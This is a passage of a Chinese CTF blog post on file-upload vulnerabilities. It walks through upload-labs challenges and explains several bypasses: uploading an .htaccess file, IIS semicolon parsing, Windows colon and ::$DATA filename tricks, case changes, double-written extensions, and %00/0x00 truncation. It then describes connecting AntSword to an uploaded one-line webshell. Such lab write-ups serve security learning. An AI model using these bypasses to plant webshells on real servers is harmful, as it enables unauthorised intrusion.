<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240321123304908.png" alt="image-20240321123304908"></p>
<ul>
<li>这个时候木马显然是不能被执行的</li>
<li>我们只需要再上传一个<code>.htaccess</code>文件，相当于修改了apache的配置</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240321123416408.png" alt="image-20240321123416408"></p>
<ul>
<li>现在我们来试着连接蚁剑</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240321123818960.png" alt="image-20240321123818960"></p>
<ul>
<li>可以看到 神奇的事情发生了，虽然后缀名仍是jpg，但可以执行木马</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240321123851230.png" alt="image-20240321123851230"></p>
<ul>
<li>服务端查看我们上传的文件，后缀名仍是jpg</li>
<li>只是我们通过上传.htaccess文件，修改了apache的配置，使得jpg文件被当成php文件来解析</li>
</ul>
<h4 id="分号配合iis解析漏洞"><a href="#分号配合iis解析漏洞" class="headerlink" title="分号配合iis解析漏洞"></a>分号配合iis解析漏洞</h4><p>另一种方法是通过分号来命名文件，可以达到绕过的效果</p>
<ul>
<li>这其实是windou2032上的IIS服务的解析漏洞</li>
<li>使用前提是要开启IIS服务端</li>
</ul>
<h4 id="冒号配合PHP和Windows环境的叠加特性"><a href="#冒号配合PHP和Windows环境的叠加特性" class="headerlink" title="冒号配合PHP和Windows环境的叠加特性"></a>冒号配合PHP和Windows环境的叠加特性</h4><p>还有一种方法就是利用PHP和Windows环境的叠加特性</p>
<ul>
<li>在Windows直接修改文件名称加上冒号 肯定是行不通的</li>
<li>所以我们先以jpg后缀上传一句话木马</li>
<li>抓包修改文件名称 加上冒号即可</li>
</ul>
<p>原理就是<strong>Windows环境会将冒号后面的内容去除</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Moose4.php:.jpg</span><br></pre></td></tr></table></figure>

<ul>
<li>.jpg可以绕过验证</li>
<li>而：则会去除后面部分 只留下<code>Moose4.php</code></li>
<li>这样就能执行木马了</li>
</ul>
<h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><ul>
<li>首先我们查看源代码</li>
<li>很明显地注意到没有改为小写的函数</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240324194925665.png" alt="image-20240324194925665"></p>
<ul>
<li>于是采用大小写绕过的方式</li>
<li>这次用bp的内嵌浏览器</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240324194815514.png" alt="image-20240324194815514"></p>
<ul>
<li>上传一个jpg后缀的一句话木马</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240324194819214.png" alt="image-20240324194819214"></p>
<ul>
<li>抓包后将后缀jpg改为Php</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240324194824327.png" alt="image-20240324194824327"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240324194828442.png" alt="image-20240324194828442"></p>
<ul>
<li>可以看到这样文件就能成功上传了</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240324194833186.png" alt="image-20240324194833186"></p>
<ul>
<li>那么问题来了，这道题有文件重命名的函数</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240324195412940.png" alt="image-20240324195412940"></p>
<ul>
<li>那么怎么通过蚁剑来连接呢？</li>
</ul>
<h4 id="文件被重命名的情况下连接蚁剑"><a href="#文件被重命名的情况下连接蚁剑" class="headerlink" title="文件被重命名的情况下连接蚁剑"></a>文件被重命名的情况下连接蚁剑</h4><ul>
<li>其实我们只需要在上传了php文件的那个网页查看源代码就好了</li>
<li>那么怎么打开那个网页呢（原网页上传的是抓包前的文件）</li>
<li>我们可以用burp suite来显示那个网页：</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240324194838551.png" alt="image-20240324194838551"></p>
<ul>
<li>然后把得到的url复制到内嵌浏览器中</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240324195736302.png" alt="image-20240324195736302"></p>
<ul>
<li>再打开网页，查看源代码即可</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240324195811258.png" alt="image-20240324195811258"></p>
<ul>
<li>用此地址便可连接蚁剑</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240324195933376.png" alt="image-20240324195933376"></p>
<h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><ul>
<li>先查看源代码</li>
<li>注意到没有过滤掉::$DATA<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240324200158129.png" alt="image-20240324200158129"></li>
<li>像前几题就有这样的黑名单过滤：</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240324200122585.png" alt="image-20240324200122585"></p>
<ul>
<li>少了<code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</code>这句话我们就可以采用Windows文件流特性来绕过</li>
<li>只需抓包后将上传的Moose9.jpg改为Moose9.php::$DATA</li>
<li>这样上传后保存的文件其实是Moose9.php</li>
</ul>
<p>(不过  前提是基于Windows系统，Linux系统就不行了)</p>
<h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><ul>
<li>分析源代码</li>
<li>首先可以看到这里有一个替换函数，将黑名单内的字符串替换成<code>“”</code>内的，在本题是替换成了空</li>
<li>第二点是黑名单里都没有了<code>.</code>,<strong>这种情况才能使用双写绕过</strong></li>
</ul>
<hr>
<ul>
<li>既然是替换成<strong>空</strong>，那么就可以操作一下了</li>
<li>采用双写绕过即可</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240324200720997.png" alt="image-20240324200720997"></p>
<ul>
<li>先抓包</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240324201215979.png" alt="image-20240324201215979"></p>
<ul>
<li>修改后缀名为<code>pphphp</code></li>
<li>注：phphpp不行噢</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240324201301130.png" alt="image-20240324201301130"></p>
<ul>
<li>可以看到，文件成功上传</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240324201306562.png" alt="image-20240324201306562"></p>
<ul>
<li>再打开上传页面 寻找保存路径</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240324201321175.png" alt="image-20240324201321175"></p>
<ul>
<li>从网页源代码中找到路径</li>
<li>可以看到上传保存的文件后缀名已经是<strong>php</strong>了</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240324201327847.png" alt="image-20240324201327847"></p>
<ul>
<li>尝试连接蚁剑</li>
<li>成功连接</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240324201331717.png" alt="image-20240324201331717"></p>
<h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><ul>
<li>分析源代码</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240324202448583.png" alt="image-20240324202448583"></p>
<ul>
<li>典型的白名单例题</li>
<li>抓包后查看请求包</li>
<li>save_path在请求头位置</li>
<li>经典的**%00绕过**</li>
</ul>
<p>原理：<u>%00在url编码中代表0</u></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240324202323525.png" alt="image-20240324202323525"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240324202326803.png" alt="image-20240324202326803"></p>
<p><strong>总结</strong></p>
<p>%00截断适用于url处编码</p>
<h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><ul>
<li>分析源代码</li>
<li>也是一道白名单类型的题</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240325231459092.png" alt="image-20240325231459092"></p>
<ul>
<li>bp抓包一下</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240325231721062.png" alt="image-20240325231721062"></p>
<ul>
<li>可以注意到，与上一题相比，<strong>upload</strong>在请求数据中，而不是在url处<strong>！</strong></li>
<li>由于文件路径不在url处，因此不能使用**%00**绕过了</li>
</ul>
<hr>
<ul>
<li>既然如此，我们就可以使用<strong>0x00</strong>绕过</li>
<li>%00适用于文件路径在请求数据中的情况</li>
</ul>
<hr>
<ul>
<li>第一步，现在upload后加上我们要命名的文件名</li>
<li>然后加上一个<strong>空格</strong></li>
<li>这时我们虽然敲的是空格，但其实是<strong>十进制</strong>的，而事实上我们需要的是十六进制的<strong>0</strong></li>
<li>于是还需要在Hex中改成十六进制的<strong>00</strong></li>
</ul>
<p>注：这个空格的作用只是便于我们在Hex中找到空格对应的十六进制编码的位置而已，改成其他有辨识度的字符其实也可以</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240325232942796.png" alt="image-20240325232942796"></p>
<ul>
<li>由于空格在十六进制中表示为20</li>
<li>寻找一下，发现20所在位置</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240325232948390.png" alt="image-20240325232948390"></p>
<ul>
<li>然后我们将其改为<strong>00</strong>，也就是十六进制的0</li>
<li>这样请求数据中的空格就变成十六进制的0了</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240325232949629.png" alt="image-20240325232949629"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240325232950582.png" alt="image-20240325232950582"></p>
<p><strong>小结</strong></p>
<p>0x00适用于<strong>upload</strong>在“请求数据”中的情况</p>
<h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><p>Pass-16</p>
<p>Pass-17</p>
<p>Pass-18</p>
<p>Pass-19</p>
<p>Pass-20</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/MooSeQAQ/tuchuang@main/img/moose.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/MooSeQAQ/tuchuang@main/img/moose.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">MooSe</div><div class="post-copyright__author_desc">乐孜不疲，元气满满</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/')">文件上传</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=文件上传&amp;url=http://example.com/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">MooSe的小窝</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/MooSeQAQ/tuchuang@main/img/moose.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/03/30/Rois%E5%86%AC%E4%BB%A4%E8%90%A5%E9%A2%98%E8%A7%A3/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Rois冬令营题解</div></div></a></div><div class="next-post pull-right"><a href="/2024/04/12/Python%E5%85%A5%E9%97%A8/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Python入门</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/MooSeQAQ/tuchuang@main/img/moose.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/MooSeQAQ/tuchuang@main/img/studyinging.jpg" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这是<b style="color:#fff">MooSe</b>的BLOG,主要记录与<b style="color:#fff">CTF</b>相关的<b style="color:#fff">笔记</b>与心得</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">希望你可以在这里找到对你有用的<b style="color:#fff">灵感</b>和<b style="color:#fff">启发</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">MooSe</h1><div class="author-info__desc">乐孜不疲，元气满满</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/MooSeQAQ" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a></div></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">1、文件上传漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">2、文件上传漏洞原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%AB%98%E5%8D%B1%E8%A7%A6%E5%8F%91%E7%82%B9"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">3、文件上传漏洞的高危触发点</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E6%A3%80%E6%B5%8B"><span class="toc-number">1.2.</span> <span class="toc-text">前端检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A4%E6%96%AD%EF%BC%9A"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.判断：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">1.2.3.</span> <span class="toc-text">3.绕过方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-%E5%88%A0%E9%99%A4js%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">3.1 删除js绕过：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-burpsuite%E6%8A%93%E5%8C%85"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">3.2  burpsuite抓包</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E7%AB%AF%E6%A3%80%E6%B5%8B"><span class="toc-number">1.3.</span> <span class="toc-text">后端检测</span></a><ol class="toc-child"><li 